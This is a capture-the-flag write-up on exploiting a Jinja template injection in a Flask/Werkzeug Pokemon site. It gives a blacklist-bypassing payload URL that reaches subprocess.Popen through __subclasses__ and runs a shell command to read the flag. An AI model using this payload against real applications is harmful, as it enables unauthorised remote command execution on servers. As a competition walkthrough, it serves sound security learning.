---
author: Garfield1002
layout: post
date: 2023-09-12 12:00:00 +0200
excerpt_separator: <!--more-->
tags: web pctf
title: "Pick your starter"
---

In this challenge, we exploit a Jinja template injection to get RCE.

<!--more-->
{% raw %}

We have a website which displays Pokemon.

![Alt text](/assets/pctf/pick-your-starter-0.png)

The server header reports `Werkzeug` so we tried the `/console` endpoint.

> Checkout `debug=True` shell that `Werkzeug` offers and was behind the [2015 Patreon Hack](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)

![](/assets/pctf/pick-your-starter-1.png)

## Vulnerability

After some experimentation, we discover that there is a **template injection attack**. Let's see the result for `/{{7*6}}`:

![Alt text](https://raw.githubusercontent.com/BasiliCS/writeups/pctf/pctf/web/pick-your-starter-2.png)

We also notice that many characters are blacklisted including `-`, `+`, `'`, `"`, `[` and `]`.

Although this webpage is entertaining, for the rest of this challenge we will be using a Python script with `BeautifulSoup` to extract the interesting text:

```py
import requests
from bs4 import BeautifulSoup
page = requests.get("http://chal.pctf.competitivecyber.club:5555/{{7*6}}")

soup = BeautifulSoup(page.content, "html.parser")

prefix_len = len("<h1>\"b'")
suffix_len = len("'\" isn't a starter Pokémon.</h1>")

extracted = str(soup.find_all("h1")[0])[prefix_len:-suffix_len]

print(extracted)
```

## Exploit

We would like to get RCE on the server. We want to access the Python base class `object` in order to access all subclasses of `object`, that is every available class in the program. Given the blacklist, we are able to do so using `()`. We can list all available classes with the `__subclasses__` method.

Here is the URL we built:
`http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__()}}`

The response looks like this (the final list is a lot longer, this is just an extract):

```
"lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;
```

We are interested in the 455th element `subprocess.Popen`, as it will give us a shell.

We cannot use the `[` or `]` characters, so we have to use the `__getitem__` method.

Finally, we want to pass our string command to the constructor. This can be easily done using `request.args.shell` and passing an argument `?shell=cat /flag.txt` to our request.

The final URL is:
`"http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}?shell=cat ../flag.txt"`

## The flag

`PCTF(wHOS7H47PoKEmoN)`
{% endraw %}
